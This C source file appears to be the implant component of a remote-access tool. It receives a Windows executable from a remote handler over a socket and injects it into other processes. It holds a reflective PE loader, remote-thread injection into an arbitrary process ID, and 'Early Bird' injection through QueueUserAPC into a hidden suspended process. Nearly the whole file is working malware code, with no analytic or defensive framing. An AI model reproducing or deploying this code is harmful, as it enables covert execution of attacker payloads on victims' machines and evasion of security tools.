#include "Reflective_Pe.h"
#include "Utils.h"
#include <stdio.h>

HANDLE proc;
LPVOID base,pe_buf,loader,thd;



void Pe_Loader(LPE_INFO pe)
{
    PIMAGE_NT_HEADERS nt;
    PIMAGE_IMPORT_DESCRIPTOR import;
    PIMAGE_BASE_RELOCATION reloc;
    PIMAGE_TLS_DIRECTORY tls;
    PIMAGE_TLS_CALLBACK * callback;
    PIMAGE_THUNK_DATA Othunk,Fthunk;
    LPVOID base;UINT_PTR delta;

    base = pe->base;
    nt = (PIMAGE_NT_HEADERS)( ((PIMAGE_DOS_HEADER)base)->e_lfanew + base );

    if(!pe->is_required_rolocation)
        goto Load_Import;

    if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
        return;

    reloc = (PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    delta = (UINT_PTR)base - nt->OptionalHeader.ImageBase;
    while(reloc->VirtualAddress)
    {
        LPVOID addr = base + reloc->VirtualAddress;
        int n = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
        LPTYPE_ENTRY entry = (LPTYPE_ENTRY) (reloc +1);
        int i ;
        for (i=0;i<n;i++,entry++)
        {
            if(entry->type==BASE_REL_TYPE)
            {
                PUINT_PTR p = (PUINT_PTR)(addr+entry->offset);
                *p+=delta;
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)((LPVOID)reloc + reloc->SizeOfBlock );
    }

    Load_Import:
        if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
            goto TLS;

        import = (PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while(import->Name)
        {
            LPVOID dll = pe->LoadDll(base+import->Name);
            if(!dll)
                return;

            Fthunk = (PIMAGE_THUNK_DATA)(base+import->FirstThunk);
            Othunk = (PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);

            if(!import->OriginalFirstThunk)
                Othunk = Fthunk;

            while(Othunk->u1.AddressOfData)
            {
                if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                {
                    *(PUINT_PTR)Fthunk = (UINT_PTR)pe->GetFuncAddr(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME nm = (PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
                    *(PUINT_PTR)Fthunk = (UINT_PTR)pe->GetFuncAddr(dll,nm->Name);
                }
                Fthunk ++;Othunk++;
            }
            import++;
        }

    TLS:
        if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress)
            goto Execute_Entry;

        tls = (PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

        if(!tls->AddressOfCallBacks)
            goto Execute_Entry;

        callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
        while(*callback)
        {
            (*callback)(base,1,NULL);callback++;
        }

     Execute_Entry:
        if(nt->FileHeader.Characteristics & 0x2000)
		{
			void (*entry)(LPVOID , DWORD ,LPVOID);
			entry=base+nt->OptionalHeader.AddressOfEntryPoint;
			(*entry)(base,1,NULL);
		}
		else
		{
			void (*entry)();
			entry=base+nt->OptionalHeader.AddressOfEntryPoint;
			(*entry)();
		}
}



void Cleanup(SOCKET sock)
{
    PE_ERROR err;
    err.code = 404;
    err.reason =GetLastError();

    if(loader)
        VirtualFreeEx(proc,loader,0,MEM_RELEASE);

    if(base)
        VirtualFreeEx(proc,loader,0,MEM_RELEASE);

    if(proc)
        CloseHandle(proc);

    if(pe_buf)
        VirtualFree(pe_buf,0,MEM_RELEASE);

    send(sock,(char *)&err,sizeof(err),0);


}


void Cleanup2(SOCKET sock)
{
    PE_ERROR err;
    err.code = 404;
    err.reason =GetLastError();

    if(thd)
        CloseHandle(thd);

    if(proc)
    {
        TerminateProcess(proc,0);
        CloseHandle(proc);
    }

    if(pe_buf)
        VirtualFree(pe_buf,0,MEM_RELEASE);

    send(sock,(char *)&err,sizeof(err),0);
}

BOOL Pe_Download_file(SOCKET sock,LPVOID buf,DWORD len)
{
    DWORD i=0;
    WSAPOLLFD fd;

    fd.fd = sock;
    fd.events  = POLLRDNORM;
    fd.revents = 0;

    while(i<len)
    {
        int r = WSAPoll(&fd,1,10000);
        if(r==0)
            return 0;

        if(r == SOCKET_ERROR)
        {
            if(WSAGetLastError()!=WSAEWOULDBLOCK)
            {
                return 0;
            }
        }

        if(r>0)
        {
            int I = recv(sock,(char *)(buf+i),2048,0);
            i+=I;
        }
    }

    return 1;
}



int Remote_Refelctive_Pe(SOCKET sock)
{
    DWORD pid,len;
    PE_INFO pe;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;

    ZeroMemory(&pe,sizeof(pe));
    proc = loader = pe_buf = base = NULL;




    recv(sock,(char *)&pid,4,0);
    recv(sock,(char *)&len,4,0);



    proc = OpenProcess(PROCESS_ALL_ACCESS,0,pid); // opening process

    if(proc == NULL)
    {
        Cleanup(sock);
        return 0;
    }



    pe_buf = VirtualAlloc(NULL,len,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

    if(pe_buf == NULL)
    {
        Cleanup(sock);
        return 0;
    }

    pid = 3;

    send(sock,(char *)&pid,4,0); // telling the handler to send data



    if(!Pe_Download_file(sock,pe_buf,len))
    {
        Cleanup(sock);
        return 404;
    }

    dos = (PIMAGE_DOS_HEADER)pe_buf;

    if(dos->e_magic!=0x5a4d)
    {
        Cleanup(sock);
        return 0;
    }

    nt = (PIMAGE_NT_HEADERS)(pe_buf + dos->e_lfanew);
    sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt+sizeof(IMAGE_NT_HEADERS));

    if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR_MAGIC)
    {
        Cleanup(sock);
        return 0;
    }



    if((base = VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
    {
        pe.is_required_rolocation = 1;
        if((base = VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
        {
            Cleanup(sock);
            return 0;
        }
    }

    pe.base = base;
    pe.GetFuncAddr = GetProcAddress;
    pe.LoadDll = LoadLibraryA;



    WriteProcessMemory(proc,base,pe_buf,nt->OptionalHeader.SizeOfHeaders,NULL);

    int i;
    for(i=0;i<nt->FileHeader.NumberOfSections;i++,sec++)
    {
        WriteProcessMemory(proc,base+sec->VirtualAddress,sec->PointerToRawData + pe_buf,sec->SizeOfRawData,NULL);

    }

    DWORD func_len = (DWORD) ((UINT_PTR)Cleanup - (UINT_PTR)Pe_Loader);

    loader = VirtualAllocEx(proc,NULL,func_len+sizeof(pe),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    if(loader == NULL)
    {
        Cleanup(sock);
        return 0;
    }

    WriteProcessMemory(proc,loader,&pe,sizeof(pe),NULL);
    WriteProcessMemory(proc,loader+sizeof(pe),Pe_Loader,func_len,NULL);

    HANDLE temp =CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)(loader+sizeof(pe)),loader,0,NULL);
    if(temp==NULL)
    {
        Cleanup(sock);
    }
    else
    {

        CloseHandle(temp);
         pid = 200;
        send(sock,(char *)&pid,4,0);
    }

    CloseHandle(proc);

    VirtualFree(pe_buf,0,MEM_RELEASE);


    return 0;
}


int Early_Bird(SOCKET sock)
{
    char path[260];
    DWORD len,op=3;
    PE_INFO pe;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;

    pe_buf = base = proc = loader = NULL;


    ZeroMemory(path,260);

    recv(sock,(char *)&len,4,0);
    recv(sock,(char *)path,260,0);

    STARTUPINFOA st;
    PROCESS_INFORMATION pi;

    ZeroMemory(&st,sizeof(st));
    st.cb = sizeof(st);




    if(!CreateProcessA(NULL,path,NULL,NULL,0,CREATE_NO_WINDOW | CREATE_SUSPENDED,NULL,NULL,&st,&pi))
    {
        Cleanup2(sock);
        return 0;
    }

    proc = pi.hProcess;thd = pi.hThread;

    pe_buf = VirtualAlloc(NULL,len,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

    if(pe_buf == NULL)
    {
        Cleanup2(sock);
        return 0;
    }

    send(sock,(char *)&op,4,0);


    if(!Pe_Download_file(sock,pe_buf,len))
    {
        Cleanup2(sock);
        return 404;
    }

    dos = (PIMAGE_DOS_HEADER)pe_buf;

    if(dos->e_magic!=0x5a4d)
    {
        Cleanup2(sock);
        return 0;
    }

    nt = (PIMAGE_NT_HEADERS)(pe_buf + dos->e_lfanew);
    sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt+sizeof(IMAGE_NT_HEADERS));

    if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR_MAGIC)
    {
        Cleanup2(sock);
        return 0;
    }



    if((base = VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
    {
        pe.is_required_rolocation = 1;
        if((base = VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
        {
            Cleanup2(sock);
            return 0;
        }
    }

    pe.base = base;
    pe.GetFuncAddr = GetProcAddress;
    pe.LoadDll = LoadLibraryA;



    WriteProcessMemory(proc,base,pe_buf,nt->OptionalHeader.SizeOfHeaders,NULL);

    int i;
    for(i=0;i<nt->FileHeader.NumberOfSections;i++,sec++)
    {
        WriteProcessMemory(proc,base+sec->VirtualAddress,sec->PointerToRawData + pe_buf,sec->SizeOfRawData,NULL);

    }

    DWORD func_len = (DWORD) ((UINT_PTR)Cleanup - (UINT_PTR)Pe_Loader);

    loader = VirtualAllocEx(proc,NULL,func_len+sizeof(pe),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    if(loader == NULL)
    {
        Cleanup2(sock);
        return 0;
    }

    WriteProcessMemory(proc,loader,&pe,sizeof(pe),NULL);
    WriteProcessMemory(proc,loader+sizeof(pe),Pe_Loader,func_len,NULL);

    if(!QueueUserAPC(loader+sizeof(pe),pi.hThread,(UINT_PTR)loader))
    {
        Cleanup2(sock);return 0;
    }

    ResumeThread(pi.hThread);
    CloseHandle(thd);
    CloseHandle(proc);
    VirtualFree(pe_buf,0,MEM_RELEASE);

    op = 200;
    send(sock,(char *)&op,4,0);

    return 0;

}
